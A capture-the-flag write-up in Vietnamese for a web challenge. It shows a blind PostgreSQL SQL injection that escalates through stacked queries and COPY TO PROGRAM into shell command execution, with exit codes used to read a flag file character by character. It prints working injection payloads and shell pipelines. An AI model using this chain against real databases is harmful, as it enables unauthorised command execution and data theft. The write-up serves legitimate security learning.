# Planetary Probe — Web (Hard)

**Flag:** `sun{bl1nd_psqli_2_rc3_p4Nd0FyZt8k2}`
**URL:** `https://planetary.web.2026.sunshinectf.games/`, no files provided.

## Đề bài

Sổ hành tinh của "Galactic Federation". Console chỉ trả lời đúng một bit: "signal detected" hoặc
"no signal", không error, không echo input.

Bit đó trước tiên dùng làm oracle cho một SQL injection điểm mù trên PostgreSQL, nhưng cờ không
nằm trong database: hai bảng duy nhất đã dump hết và không đối tượng nào khác chứa chuỗi `sun{`.
Bit thứ hai lấy từ nơi khác. Tham số `planet` cho phép stacked statement, và user `probe` là thành
viên `pg_execute_server_program`, nên `COPY (SELECT 1) TO PROGRAM '<cmd>'` chạy được shell command
với quyền OS user `postgres`, và chính exit code của command trở thành câu hỏi yes/no về
filesystem. Cờ được đọc từng ký tự bằng oracle đó.

## Phân tích ban đầu

### Bề mặt bài toán

Form duy nhất `GET /probe?planet=<x>`, response chỉ có hai hình thái:

```html
<body class="is-carrier"> ... "Signal detected"
<body class="is-null">    ... "No signal"
```

Route khác trả 404 kiểu Flask (207 byte). `OPTIONS /probe` cho `Allow: HEAD, OPTIONS, GET`;
header, cookie và tham số thừa không làm đổi gì. Tầng HTTP hết đường, bài nằm ở chuỗi truy vấn.

### SQL injection và oracle một bit

`MARS' OR 1=1-- ` trả carrier còn `MARS' OR 1=1#` trả null, tức PostgreSQL (`#` không phải comment)
và chuỗi được ghép thẳng:

```sql
SELECT id FROM planets WHERE name = '<payload>'
```

Oracle chuẩn hoá: `MARS' AND (<expr>)-- ` trả carrier khi và chỉ khi `<expr>` đúng. MARS là row có
thật nên không có chuyện điều kiện sai do neo sai.

Bẫy đầu tiên: app lower-case toàn bộ payload. `ascii('A')=65` sai trong khi `ascii('A')=97` đúng và
`ascii(chr(65))=65` đúng. Hệ quả: không được gõ ký tự in hoa trong bất kỳ pattern nào, và mọi so
sánh phải quy về số (`ascii`, `length`), nếu không thì "không khớp" chỉ là chữ hoa bị hạ thành chữ
thường.

## Các hướng đã loại

### Cờ không nằm trong database

Dump schema qua `pg_class`/`pg_attribute` (không dùng `information_schema` cho câu hỏi "có schema
lạ không", vì view đó ẩn những gì mình không có quyền):

* `planets(id, name, diameter_km, description)`: 8 row, đường kính đều là số thật, `string_agg`
  toàn bộ 337 ký tự, không có dấu `{` nào (`p::text LIKE '%{%'` false), không có control char (so
  `octet_length` với `length`, và `[[:cntrl:]]`).
* `zleak(v)`: đúng 1 row, giá trị là chuỗi `select v from zleak`. Đây là bảng mồi, xác nhận đọc
  được DB chứ không phải cờ.
* Quét `sun{` (dựng bằng `chr()` để khỏi bị lower-case) trên `pg_proc.prosrc`, `pg_description`,
  `pg_shdescription`, `pg_seclabel`, `pg_enum`, `pg_indexes.indexdef`, `pg_views`, `pg_rules`,
  `pg_attribute` (kể cả `attmissingval`), `pg_policies`, `pg_foreign_*`, `pg_subscription`,
  `pg_largeobject`, `pg_statistic` (stavalues 1..4), `pg_auth_members`: tất cả false, và mỗi phép
  thử đều có control dương đi kèm (cùng phép thử đó trên một chuỗi chứa `sun{` phải true).
* Hai chỗ từng báo true hoá ra dương tính giả: `pg_db_role_setting` và `reloptions`, chỉ vì array
  cast in ra `{...}`. Tìm `{` vô nghĩa, phải tìm nguyên `sun{` bằng `position()`.
* `pg_stat_activity` cũng từng báo chứa `sun{`, đó là query của chính phép thử. Phải loại
  `pid<>pg_backend_pid()` và dựng pattern bằng `chr()`.

## Chuỗi khai thác

### Bước 1 - Oracle thứ hai: exit code của program

`MARS'; SELECT pg_sleep(3); -- ` chậm đúng 3.8 s, vậy stacked statement chạy thật. Kết luận "mọi
statement phụ đều bị chặn" đưa ra trước đó là sai, và nguyên nhân là requirement của driver: batch
phải kết thúc bằng một SELECT trả row, psycopg2 raise nếu không, mà raise thì render ra "no
signal" y hệt một điều kiện sai.

`pg_auth_members` cho thấy `pg_execute_server_program -> probe`, dù `has_privs_of_role()` trả
false: quyền thành viên vẫn có, chỉ không tự thừa hưởng. Với quyền đó:

```sql
MARS'; COPY (SELECT 1) TO PROGRAM '<cmd>'; SELECT 1; -- 
```

`<cmd>` chạy qua `/bin/sh -c` với quyền OS user postgres (`id -un | grep -q ^postgres` xác nhận).
Command exit khác 0 thì PostgreSQL raise, app trả "no signal". Control: `test -f /etc/passwd` cho
carrier, `test -f /no.such` cho null. Đây là một oracle mới, hỏi được về cả filesystem chứ không
chỉ trong DB.

Vài thứ trong image không có (`cat`, `python3`, `md5sum`, và `grep -qiF` không chạy được), nên một
phép thử trả false chỉ có nghĩa là false khi chắc chắn tool tồn tại; không ít "false" thực chất là
lệnh không tồn tại.

Định vị cờ: `/flag.txt` tồn tại nhưng rỗng (`test -s` false).
`find / -name "*flag*" -type f -exec grep -ls sun{ {} +` mới chỉ ra file thật; hai path tìm được
trỏ cùng một nội dung, `cmp -s` xác nhận.

### Bước 2 - Đọc file, mỗi request một ký tự

Pipeline gọn trong một request, không được giữ trạng thái giữa hai request:

```
f=$(find / -name "*flag*" -type f -exec grep -ls sun{ {} + 2>/dev/null | grep -v /tmp/ | sort | head -1);
grep -aoE "sun[{][^}]*[}]" "$f" | head -1 | cut -c<K> | grep -qE "[class]"
```

Ba chi phí ẩn đã làm hỏng vài vòng đọc:

1. Replica. Instance chạy nhiều hơn một container. Bản đầu ghi kết quả ra `/tmp` rồi đọc ở request
   sau, mà request sau rơi vào container khác nên mất file. Tệ hơn, file rác `/tmp` cũng chứa
   `sun{` nên `grep -rl` trả hai kết quả và đọc phải dữ liệu do mình tạo ra. Sửa: mỗi probe tự
   chứa toàn bộ pipeline, và loại `/tmp/` khỏi kết quả find.
2. Probe chậm bị tính là probe sai. `grep -r` cả thư mục dữ liệu PostgreSQL có lúc vượt timeout,
   và timeout đọc thành "không khớp", làm sai phân nhị phân; có lần nó báo cờ bắt đầu bằng `0`
   trong khi `^sun[{]` vẫn true. Sửa: chốt file theo tên bằng `find -name`, chỉ đọc từng byte bằng
   `cut -c<K>`. Cách này nhanh và các vị trí thành độc lập nên song song hoá được.
3. Suy chữ hoa từ một phủ định là sai. Quy tắc cũ "thử `[d]` có phân biệt hoa thường mà fail thì
   chắc là `D`" hỏng vì timeout cũng cho fail, nên `d` biến thành `D` ngẫu nhiên. Sửa: cần bằng
   chứng dương, `[[:upper:]]` (toàn dấu câu nên không bị lower-case hoá) phải true và `[d]` phải
   false thì mới kết luận `D`.

Mỗi ký tự được đọc hai lần và hai lần phải khớp nhau. Pattern là chuỗi bracket class
(`[s][u][n][{]...`) để `{`, `}` và `.` không bao giờ bị hiểu lại thành meta.

## Flag

```
[*] exact string, end-anchored: True
[*] negative control (last char 3 instead of 2): False
[*] negative control (one uppercase where there is none): False
[*] length 35 and nothing more: True True
```

Độ dài đo được 35 (`wc -c` ra 36 kể cả newline), không còn ký tự ở vị trí 36, hai control âm tính
đều false.

```
sun{bl1nd_psqli_2_rc3_p4Nd0FyZt8k2}
```

## File trong thư mục

| file | nội dung |
| --- | --- |
| `exploit.py` | chạy hết chain: xác nhận 2 oracle, đọc cờ, verify |
| `extract.py` | oracle SQL + helper đọc song song |
| `definitive.py` | bộ đọc ký tự cuối cùng (`cut -c`, case bằng bằng chứng dương) |
| `po.py`, `shell.py`, `flagpos.py`, `final_read.py` | các vòng trung gian, giữ lại để xem lịch sử |
| `sweep3.py` | quét `sun{` trong toàn bộ catalog, có control |
| `analysis/` | log từng vòng, schema đã dump |
| `flag.txt` | cờ |

## Reproduce

```bash
python exploit.py        # xác nhận cả hai oracle, đọc lại cờ và verify toàn chuỗi
```
